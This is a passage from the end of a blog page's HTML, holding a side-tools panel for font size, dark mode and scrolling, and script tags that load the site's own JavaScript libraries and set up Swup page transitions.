    <div class="right-side-tools-container">
        <div class="side-tools-container">
    <ul class="hidden-tools-list">
        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-plus"></i>
        </li>

        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-minus"></i>
        </li>

        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
            <i class="fa-regular fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
            <i class="fa-regular fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="visible-tools-list">
        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
            <i class="fa-regular fa-cog fa-spin"></i>
        </li>
        
            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
        
    </ul>
</div>

    </div>

    <div class="image-viewer-container">
    <img src="">
</div>


    

</main>


    
<script src="/js/libs/Swup.min.js"></script>

<script src="/js/libs/SwupSlideTheme.min.js"></script>

<script src="/js/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>







<script src="/js/tools/imageViewer.js" type="module"></script>

<script src="/js/utils.js" type="module"></script>

<script src="/js/main.js" type="module"></script>

<script src="/js/layouts/navbarShrink.js" type="module"></script>

<script src="/js/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/layouts/categoryList.js" type="module"></script>





    
<script src="/js/tools/codeBlock.js" type="module"></script>




    
<script src="/js/layouts/lazyload.js" type="module"></script>




    
<script src="/js/tools/runtime.js"></script>

    
<script src="/js/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/libs/Typed.min.js"></script>

  
<script src="/js/plugins/typed.js" type="module"></script>








    
<script src="/js/libs/anime.min.js"></script>





    
<script src="/js/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/layouts/essays.js" type="module" data-swup-reload-script=""></script>




</body>
</html>
